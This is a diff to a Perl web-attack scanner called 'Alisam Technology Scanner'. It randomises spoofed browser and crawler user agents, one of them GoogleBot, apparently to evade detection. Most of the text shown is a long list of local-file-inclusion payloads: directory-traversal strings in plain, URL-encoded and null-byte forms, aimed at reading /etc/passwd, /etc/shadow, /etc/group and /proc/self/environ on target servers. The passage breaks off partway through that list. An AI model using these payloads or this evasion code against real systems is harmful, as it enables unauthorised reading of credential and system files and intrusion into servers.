@@ -1,6 +1,7 @@
 #!/usr/bin/perl
 #
-#################################################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 # This software is Copyright (c) 2015 by Ali Mehdioui.
 #
 # This is free software, licensed under:
@@ -96,60 +97,89 @@
 #	THE POSSIBILITY OF SUCH DAMAGE.
 #The End
 #
-#################################################################################
-#
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 #Alisam Technology Scanner
 #Requiered libreries
 #apt-get install libxml-simple-perl
 #aptitude install libio-socket-ssl-perl
 #aptitude install libcrypt-ssleay-perl
+#
 use warnings;
 use Term::ANSIColor;
 use IO::Socket::INET;
 use LWP::UserAgent;
-my @user_agents = (
-		'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
-        'Mozilla/5.0 (Windows; I; Windows NT 5.1; ru; rv:1.9.2.13)',
-		'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0',
-		'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:21.0) Gecko/20100101 Firefox/21.0',
-		'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)',
-		'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)',
-		'Mozilla/5.0 (Linux; U; Android 4.2.2; zh-cn; LNV-Lenovo K910e/S100; 1080*1920; CTC/2.0) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safa',
-		'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
-		'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1',
-		'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0',
-		'Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.02 [en]',
-		'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
-		'Lynx/2.8.8dev.12 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/2.12.14',
-		'Opera/9.20 (Windows NT 6.0; U; en)',
-		'Mozilla/5.0 (X11; Linux) KHTML/4.9.1 (like Gecko) Konqueror/4.9',
-		'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; zh-cn) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
-		'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
-		'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; it-it) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
-		'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; fr-fr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
-		'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; es-es) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
-		'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
-		'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-gb) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
-		'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; de-de) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
-		'Mozilla/5.0 (X11; Linux 3.5.4-1-ARCH i686; es) KHTML/4.9.1 (like Gecko) Konqueror/4.9',
-		'Mozilla/5.0 (compatible; Konqueror/3.5; SunOS)',
-		'Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)',
-		'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
-		'Mozilla/5.0 (X11) KHTML/4.9.1 (like Gecko) Konqueror/4.9)'
-);
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+my @strings=('ar_JO', 'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'cs-CZ', 'uk', 'vi_VN', 'vi', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW', 'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs', 'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA', 'en_GB', 'en_US', 'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE', 'de_LU', 'de_CH', 'de', 'el_CY', 'in', 'ga_IE', 'ga', 'it_IT', 'it_CH', 'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY', 'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT', 'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME', 'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC', 'es_SV', 'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE', 'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR', 'tr', 'uk_UA', 'uk');
+$myrand = $strings[int rand @strings];
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+my @sys=(
+"",
+"compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; $myrand",
+"compatible; MSIE 7.0; Windows NT 5.1; $myrand",
+"compatible; MSIE 6.0; Windows NT 5.1; $myrand",
+"compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1; $myrand;",
+"compatible; Konqueror/3.5; $myrand; SunOS",
+"compatible; Konqueror/3.5; $myrand; NetBSD 4.0_RC3; X11; $myrand",
+"Macintosh; U; PPC Mac OS X 10_5_8; $myrand",
+"Macintosh; Intel Mac OS X 10.6; $myrand; rv:21.0",
+"Macintosh; Intel Mac OS X 10_9_0; $myrand",
+"Macintosh; U; Intel Mac OS X 10_6_6; $myrand",
+"X11; Linux 3.5.4-1-ARCH i686; $myrand",
+"Linux; U; Android 4.2.2; $myrand; LNV-Lenovo K910e/S100; 1080*1920; CTC/2.0; $myrand",
+"iPad; CPU OS 6_0 like Mac OS X; $myrand",
+"Windows NT 5.1; $myrand",
+"Windows; I; Windows NT 5.1; $myrand; rv:1.9.2.13",
+"Windows NT 6.1; $myrand; rv:24.0",
+"Windows NT 6.1; WOW64; $myrand",
+"Windows NT 6.2; WOW64; $myrand; rv:16.0.1",
+"Windows 2000; WOW64; $myrand; rv:16.0.1",
+"Windows 98; WOW64; $myrand; rv:16.0.1",
+"Windows 95; WOW64; $myrand; rv:16.0.1"
+);        
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+my @vary=(
+"",
+"KHTML/3.5.7 (like Gecko)",
+"Opera",
+"SeaMonkey",
+"Safari",
+"Dragon",
+"GNU IceCat",
+"Seamonkey",
+"Galaxy",
+"GoogleBot",
+"Tor Browser",
+"Bimbot",
+"Konqueror",
+"Flock",
+"Chrome",
+"Mobile",
+"AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
+"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
+"AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safa",
+"AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
+"Gecko/20100101 Firefox/21.0",
+"Gecko/20100101 Firefox/24.0",
+"Gecko/20121011 Firefox/16.0.1",
+"KHTML/4.9.1 (like Gecko) Konqueror/4.9"
+);        
+my $agent = "Mozilla/5.0 (".$sys[int rand @sys].";) ".$vary[int rand @vary];
 my $ua = LWP::UserAgent->new(
-         agent		=> $user_agents[rand @user_agents],
+         agent		=> $agent,
 		 cookie_jar	=> HTTP::Cookies->new(),
 );
 $ua->env_proxy;
-$ua->timeout(10);
+$ua->timeout(15);
 use HTTP::Cookies;
 use File::Basename;
 use FindBin '$Bin';
 system(($^O eq 'MSWin32') ? 'cls' : 'clear');
-
-###################################################################		
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 print color 'bold cyan';
 print "\n";
 print "        ###    ########  ######   ######     ###    ##    ##     ";
@@ -188,11 +218,12 @@ print "`-'--^--`-'\n";
 print "___________________( No monopoly for knowledge )_______________/-------------/\n";
 print color RESET;
 print "\n";
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 if (!@ARGV) {
   print color 'bold yellow';
-  print "[!] Correct use ./",basename($0)," <option>\n";
-  print "[!] Correct use ./",basename($0)," --help\n";
+  print "[!] Usage ./",basename($0)," <option>\n";
+  print "[!] Usage ./",basename($0)," --help\n";
   print color RESET;
   exit();
 }else{
@@ -201,16 +232,19 @@ if (!@ARGV) {
   print color RESET;
   desclaimer();
 }  
-
-###################################################################		
-
-sub LFI {@LFI =("/passwd.txt", "/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F..<!---->..%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00",".